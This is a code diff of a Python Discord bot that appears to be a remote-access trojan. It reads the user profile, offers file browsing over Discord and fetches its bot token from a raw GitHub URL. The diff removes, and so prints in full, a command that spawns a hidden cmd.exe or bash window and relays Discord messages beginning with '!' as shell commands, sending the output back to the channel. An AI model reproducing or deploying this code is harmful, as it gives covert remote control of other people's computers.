@@ -32,7 +32,6 @@ from typing import Optional
 import win32com.client
 from pathlib import Path
 import socket as st1
-import platform
 
 
 user_profile = os.environ['USERPROFILE']
@@ -735,76 +734,6 @@ async def browse(interaction: nextcord.Interaction):
         view = FileView(initial_path, [])
         await interaction.response.send_message("Browse files:", view=view)
 
-@client.slash_command(name="start_terminal", description="Start a hidden terminal window")
-async def start_terminal(interaction: Interaction):
-    global terminal_process, output_task, output_channel
-
-    if terminal_process is not None and terminal_process.poll() is None:
-        await interaction.response.send_message("Terminal is already running.", ephemeral=True)
-        return
-
-    # Spawn terminal depending on OS
-    if platform.system() == "Windows":
-        terminal_process = subprocess.Popen(
-            ["cmd.exe"],
-            stdin=subprocess.PIPE,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            creationflags=subprocess.CREATE_NO_WINDOW,
-            bufsize=1,
-            universal_newlines=True
-        )
-    else:
-        terminal_process = subprocess.Popen(
-            ["/bin/bash"],
-            stdin=subprocess.PIPE,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            start_new_session=True,
-            bufsize=1,
-            universal_newlines=True
-        )
-
-    output_channel = interaction.channel
-    output_task = asyncio.create_task(read_terminal_output())
-
-    await interaction.response.send_message("Hidden terminal started.", ephemeral=True)
-
-
-async def read_terminal_output():
-    global terminal_process, output_channel
-    while terminal_process and terminal_process.poll() is None:
-        try:
-            line = await asyncio.to_thread(terminal_process.stdout.readline)
-            if line:
-                # Prevent flooding the channel if a lot of output comes through
-                if output_channel:
-                    await output_channel.send(f"```\n{line.strip()}\n```")
-        except Exception as e:
-            if output_channel:
-                await output_channel.send(f"Error reading output: {e}")
-            break
-
-@client.event
-async def on_message(message):
-    global terminal_process
-
-    await client.process_commands(message)  # Important for slash commands to still work
-
-    if message.author.bot:
-        return
-
-    if terminal_process is None or terminal_process.poll() is not None:
-        return  # Terminal isn't running
-
-    if message.content.startswith("!"):
-        command = message.content[1:] + "\n"
-        try:
-            terminal_process.stdin.write(command)
-            terminal_process.stdin.flush()
-            await message.channel.send(f"✅ Command sent: `{command.strip()}`")
-        except Exception as e:
-            await message.channel.send(f"❌ Failed to send command: {e}")
 
 print("Getting token")
 r = requests.get("https://raw.githubusercontent.com/skibidi-123456/skibidi/refs/heads/info/token")
